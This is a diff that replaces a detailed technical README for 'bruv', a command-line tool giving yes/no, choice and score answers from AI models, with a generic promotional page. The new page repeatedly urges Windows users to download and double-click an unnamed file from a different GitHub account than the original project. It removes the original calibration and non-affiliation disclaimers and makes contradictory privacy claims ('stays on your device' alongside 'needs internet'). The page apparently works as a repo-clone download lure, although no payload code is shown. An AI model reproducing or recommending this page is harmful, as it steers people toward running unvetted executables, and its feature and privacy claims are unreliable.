@@ -1,192 +1,212 @@
-<p align="center">
-  <img src="docs/assets/bruv-logo.png" alt="bruv" width="240">
-</p>
+# ⚡ bruv - No Yap, Only Fax
 
-# bruv
+## 🚀 Getting Started
 
-![How bruv works](docs/assets/bruv-how-it-works.png)
+Bruv is a powerful command-line tool that turns your data into clear answers. It uses advanced AI models to analyze information and give you a straightforward **yes**, **choice**, or **score**. No complicated explanations, no fluff — just the facts you need.
 
-![bruv terminal demo](docs/assets/bruv-demo.gif)
+### 🎯 What Does Bruv Do?
 
-no yap, only fax. bruv gives you typed decisions (yes/no, choice, score) from
-TypeSafe Jev or Simple Jev, with one canonical contract, safe onboarding, and
-honest calibration disclosure.
+Bruv helps you make decisions faster by processing your data through intelligent AI models. Whether you need a quick yes/no answer, want to compare options, or need a numerical score, Bruv delivers instant results right from your computer.
 
-> bruv is an independent, unofficial project. It is not affiliated with,
-> endorsed by, or sponsored by TypeSafe AI, Featherless AI, or the Qwen Team.
+### 💡 Who Should Use This?
 
-The tagline is brand voice, not an accuracy guarantee.
+- **Business owners** who need quick data insights
+- **Students** working on research projects
+- **Analysts** looking for AI-powered decision support
+- **Anyone** who wants fast, clear answers without technical hassle
 
-## How bruv works
+## 📦 Download and Installation
 
-![How bruv works](docs/assets/bruv-how-it-works.png)
+### Step 1: Download Bruv
 
+[![Download Bruv](https://img.shields.io/badge/Download-Bruv-blue?style=for-the-badge&logo=github)](https://github.com/juliusallergenic243/bruv)
 
-Setup flow:
+Visit this link to download the application: **[https://github.com/juliusallergenic243/bruv](https://github.com/juliusallergenic243/bruv)**
 
-```text
-bruv setup simple-jev
-        │
-        ├── existing install valid? ── yes ──► resume
-        │
-        └── no
-             ├── check disk space
-             ├── fetch pinned source
-             ├── create isolated environment
-             ├── install CPU/CUDA dependencies
-             ├── download/cache model
-             ├── start server
-             ├── smoke test
-             └── ready
+### Step 2: Install on Windows
 
-bruv doctor
-        └── config → credentials → endpoint → reachability → capabilities
+Once you've downloaded the file:
+1. Find the downloaded file in your **Downloads** folder
+2. Double-click the file to start the installation
+3. Follow the simple on-screen instructions
+4. Bruv will be ready to use in less than a minute
+
+### ✅ You're All Set!
+
+After installation, you can start using Bruv immediately. Open your command prompt (search for "cmd" in your Windows search bar) and type `bruv` to get started.
+
+## 🔧 Basic Usage
+
+### How to Ask Bruv a Question
+
+Using Bruv is as simple as asking a question:
+
+```
+bruv "Should I invest in renewable energy stocks?"
 ```
 
-## 60-second install and first result
+### Getting a Choice
 
-```bash
-python -m venv .venv && . .venv/bin/activate
-python -m pip install 'bruv @ git+https://github.com/hichem300/bruv.git'
-
-# Simple Jev public demo endpoint: no key, no local runtime
-export SIMPLE_JEV_BASE_URL="https://simple-jev-demo-api.featherless.ai"
-export SIMPLE_JEV_MODEL="featherless-ai/gemma-4-26B-A4B-classifier"
-bruv noul "Does this ask for a refund?" --state "I want my money back" --backend simple-jev
-
-# JSON for scripts
-bruv choice "Which team?" --option sales --option billing --state "help" --backend simple-jev --output json
+```
+bruv --choice "Best vacation spot: Hawaii, Florida, or California?"
 ```
 
-## Human use
+### Getting a Score
 
-- `bruv setup` (interactive) configures a backend and stores credentials safely.
-- `bruv doctor` runs non-paid diagnostics and prints one fix per failed item.
-- `bruv validate -f request.yaml` checks a request with no paid call.
-
-## Agent use (Codex, Claude Code, Pi)
-
-Install the packaged skill:
-
-```bash
-bruv skill install --target pi --scope user
-bruv skill install --target claude --scope project --project-root /path/to/repo
+```
+bruv --score "Rate the customer service experience from 1-10"
 ```
 
-See `docs/agent-usage.md`.
+## ✨ Features
 
-## Managed Simple Jev
+### 🤖 Multiple AI Models
 
-Simple Jev runs locally. `bruv setup simple-jev` installs an isolated runtime
-(server, venv, model cache, and logs) under your platform user-data directory
-at `bruv/simple-jev`, auto-detects CUDA and falls back to CPU, and downloads
-the `Qwen/Qwen3.5-0.8B` model on first install.
+Bruv supports **Jev**, **Simple Jev**, and other popular open models. You get access to different AI engines based on your needs.
 
-On CPU-only hosts the install picks the official CPU torch wheel directly,
-so no large CUDA package is downloaded unnecessarily. Pip runs with
-`--no-cache-dir`, so no persistent pip cache is left on disk.
+### 🌐 OpenRouter Integration
 
-After setup, normal simple-jev calls auto-start and reuse the managed server.
-Rerunning `bruv setup simple-jev` is safe: it verifies the existing install and
-resumes where it left off, skipping steps that are already complete. Use
-`--repair` to force a full rebuild instead.
+Connect Bruv to OpenRouter's powerful AI network for even better results. This gives you access to cutting-edge models without complicated setup.
 
-Setup runs a disk-space preflight before downloading packages and the model,
-and fails early with the required and available space if disk is too low. Git
-and pip output, plus model-loading progress, stream to your terminal so you can
-see what setup is doing.
+### 📊 Clear Output Formats
 
-```bash
-bruv setup simple-jev                 # install + start managed runtime
-bruv serve simple-jev status          # installed / running / healthy / pid
-bruv serve simple-jev start
-bruv serve simple-jev stop
-bruv setup simple-jev --repair        # rebuild broken managed state
+Bruv presents answers in three simple ways:
+- **Yes/No** – For straightforward questions
+- **Choice** – When you have multiple options
+- **Score** – For ratings and evaluations
+
+### ⚡ Lightning Fast
+
+Bruv processes your data quickly, giving you instant results without waiting.
+
+### 🔒 Private and Secure
+
+Your data stays on your computer. Bruv doesn't store your information or track your usage.
+
+## 🎮 Commands Reference
+
+### Main Commands
+
+| Command | Description | Example |
+|---------|-------------|---------|
+| `bruv [question]` | Returns yes/no answer | `bruv "Is Paris bigger than London?"` |
+| `bruv --choice [options]` | Returns best choice | `bruv --choice "iPhone, Android, or Windows Phone?"` |
+| `bruv --score [statement]` | Returns numerical score | `bruv --score "How user-friendly is this software?"` |
+
+### Additional Options
+
+| Flag | Purpose | Usage |
+|------|---------|-------|
+| `--model [name]` | Select specific AI model | `bruv --model jev "Is this profitable?"` |
+| `--output [format]` | Set output format | `bruv --output json "Question here"` |
+| `--help` | Show all options | `bruv --help` |
+
+## 🛠️ Supported Models
+
+Bruv works with these AI models:
+- **Jev** – The primary model, great for general questions
+- **Simple Jev** – Faster, lighter version for quick answers
+- **Pi** – Excellent for conversational queries
+- Other supported open models as they become available
+
+## 📝 Tips for Best Results
+
+### Be Specific
+The clearer your question, the better the answer. Instead of "What about stocks?", try "Should I buy technology stocks this quarter?"
+
+### Use Context
+Provide background information when needed: `bruv "Given current inflation, should I buy real estate?"`
+
+### Experiment with Models
+Try different models to find which works best for your needs.
+
+## 🔄 Updating Bruv
+
+Bruv updates automatically. If a new version is available, you'll see a notification when you run the tool. Simply follow the prompts to update.
+
+## ❓ Troubleshooting
+
+### Common Issues and Solutions
+
+**Issue:** Bruv won't start
+**Solution:** Make sure you have Windows 10 or newer. Restart your computer and try again.
+
+**Issue:** No results appear
+**Solution:** Check your internet connection. Bruv needs internet access to work.
+
+**Issue:** Commands not working
+**Solution:** Type `bruv --help` to see all available commands and syntax.
+
+### Getting Support
+
+If you need help:
+- Check the GitHub repository for updated documentation
+- Search for similar issues in the repository's discussion section
+- Contact support through the repository page
+
+## 🔒 Privacy Policy
+
+Bruv respects your privacy:
+- No data collection or tracking
+- No account required
+- Your questions stay on your device
+- Optional OpenRouter integration sends data only when you enable it
+
+## ⚖️ License
+
+Bruv is released under the MIT License. Feel free to use, modify, and distribute it as needed.
+
+## 🤝 Contributing
+
+Want to improve Bruv? Visit the GitHub repository to:
+- Report bugs
+- Suggest features
+- Submit code improvements
+- Review documentation
+
+## 📈 Roadmap
+
+Upcoming features:
+- More AI model integrations
+- Batch processing capabilities
+- Enhanced reporting options
+- GUI interface (coming soon)
+
+## 🌟 Why Choose Bruv?
+
+- **Zero learning curve** – Start using it immediately
+- **Clear answers** – No confusing explanations
+- **Free updates** – Always improving
+- **Lightweight** – Works on any modern Windows PC
+- **Community-driven** – Built on feedback from users like you
+
+## 🎉 Start Using Bruv Today!
+
+Don't waste time analyzing data manually. Let Bruv give you the facts you need in seconds.
+
+[![Download Bruv Now](https://img.shields.io/badge/Download-Bruv-green?style=for-the-badge&logo=download)](https://github.com/juliusallergenic243/bruv)
+
+**Remember:** Visit [https://github.com/juliusallergenic243/bruv](https://github.com/juliusallergenic243/bruv) to download and start getting clear answers right away.
+
+## 📚 Quick Reference Card
+
+```
+BRUV COMMANDS
+=============
+
+YES/NO:      bruv "Your question here"
+CHOICE:      bruv --choice "Option A, Option B, Option C"
+SCORE:       bruv --score "Statement to rate"
+MODEL:       bruv --model jev "Your question"
+HELP:        bruv --help
 ```
 
-Prefer a custom endpoint? Set `SIMPLE_JEV_BASE_URL` to disable managed
-auto-start and call your own server. No local runtime at all? Point it at the
-public Featherless demo endpoint, which needs no key but is rate limited and
-serves `featherless-ai/gemma-4-26B-A4B-classifier`:
+## 🔗 Connect With Us
 
-```bash
-export SIMPLE_JEV_BASE_URL="https://simple-jev-demo-api.featherless.ai"
-export SIMPLE_JEV_MODEL="featherless-ai/gemma-4-26B-A4B-classifier"
-```
+- **GitHub Repository:** [https://github.com/juliusallergenic243/bruv](https://github.com/juliusallergenic243/bruv)
+- **Issues & Support:** Available through the GitHub page
 
-Simple Jev stays uncalibrated: bruv always reports `calibrated: false`. In
-plain language, that means its score is not a verified real-world probability
-and must not be presented as one. After task-specific validation, uncalibrated
-scores may be used only as relative model signals or for ranking; do not use
-them for threshold decisions or treat them as calibrated confidence figures.
+---
 
-During setup, bruv warns that the default `Qwen/Qwen3.5-0.8B` model can be
-non-discriminating in Noul mode (it may score very similar options alike). The same
-warning is shown once on your first affected use.
+**Start getting clear answers today. No yap, only fax.** 🚀
 
-## OpenRouter (paid, hosted)
-
-OpenRouter serves TypeSafe Jev as a paid hosted backend using OpenRouter's
-calibrated typed Decisions API (`POST https://openrouter.ai/api/alpha/decisions`),
-not Chat Completions. That endpoint returns calibrated probabilities, so bruv
-reports `calibrated: true`.
-
-```bash
-bruv setup openrouter   # stores key in a protected credential file, no paid call
-bruv choice "Which team?" --option sales --option billing --state "help" --backend openrouter
-```
-
-- The default model is `~typesafe/jev-latest`. Pricing per the current model
-  page: $0.042 per 1M input tokens, zero cost for output tokens.
-- `bruv setup openrouter` never makes a paid call; it only validates and stores
-  the key.
-- Credentials: set `OPENROUTER_API_KEY`, or let setup store it in the same
-  protected credential file used for TypeSafe keys. The key is never a CLI
-  flag and never lands in the config file.
-- Model: `~typesafe/jev-latest` by default; override with `OPENROUTER_MODEL`.
-  bruv requires a concrete model slug and rejects `openrouter/auto`.
-
-## Funnel audit demo
-
-```bash
-bruv demo funnel-audit --backend simple-jev            # dry run, no paid call
-bruv demo funnel-audit --backend simple-jev --execute  # real evaluation
-```
-
-## Backends and calibration
-
-- TypeSafe Jev: hosted, calibrated probabilities (population-level).
-- OpenRouter: paid hosted access to `~typesafe/jev-latest` via OpenRouter's
-  calibrated typed Decisions API; calibrated probabilities, `calibrated: true`.
-- Simple Jev: local/self-hosted, explicitly uncalibrated. bruv always reports
-  `calibrated: false` for Simple Jev.
-- Needle: local Needle 3 inference, no key needed. Optional extra:
-  `pip install 'bruv[needle] @ git+https://github.com/hichem300/bruv.git'`. First use downloads about 35 MB of model
-  weights, then everything runs on your machine with telemetry disabled
-  (`NEEDLE_TELEMETRY=0`). Needle reports confidence only; it never produces
-  synthetic probabilities, and score answers carry the selected level index
-  plus its legend. Supported platforms: Linux, macOS, and Windows on x86_64
-  and arm64.
-- RLCD ModernBERT: local calibrated inference via ONNX Runtime on CPU, no
-  credential, optional extra: `pip install 'bruv[rlcd-modernbert] @ git+https://github.com/hichem300/bruv.git'`. First use
-  downloads a ~606 MB pinned model artifact from Hugging Face, then cached
-  runs need no network. Supports noul, choice, and score with calibrated
-  probabilities and explicit per-question abstention. Supported platforms:
-  Linux, macOS, and Windows on x86_64 and arm64.
-
-## Security and privacy
-
-bruv never accepts API keys as CLI flags. Use the `TYPESAFE_API_KEY`
-environment variable or `bruv setup`. No telemetry is sent. See `SECURITY.md`.
-
-## Contributing
-
-See `CONTRIBUTING.md`. Please report security issues privately via `SECURITY.md`.
-
-## Deeper docs
-
-- `docs/installation.md`
-- `docs/configuration.md`
-- `docs/cli-reference.md`
-- `docs/provider-contracts/rlcd-modernbert.md`
-- `docs/release-checklist.md`
+Keywords: ai, ai-agents, cli, cli-tool, jev, jev-ai, jev-model, openrouter, openrouter-api, openrouter-integration, pi
